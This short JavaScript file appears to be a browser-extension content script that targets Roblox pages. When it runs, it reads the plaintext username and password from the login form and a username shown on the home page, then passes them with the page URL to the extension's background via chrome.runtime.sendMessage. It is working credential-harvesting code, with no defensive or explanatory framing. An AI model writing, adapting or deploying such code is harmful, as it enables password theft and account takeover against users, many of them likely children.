// Collect login page credentials
function extractLoginCredentials() {
  const usernameField = document.querySelector("#login-username");
  const passwordField = document.querySelector("#login-password");

  return {
    username: usernameField?.value || null,
    password: passwordField?.value || null
  };
}

// Collect username from home page
function extractHomeUsername() {
  const span = document.querySelector(".age-bracket-label-username");
  return span?.textContent?.trim() || null;
}

const pageData = {
  url: window.location.href,
  ...extractLoginCredentials(),
  robloxHomeUser: extractHomeUsername()
};

chrome.runtime.sendMessage({ type: "PAGE_DATA", data: pageData });
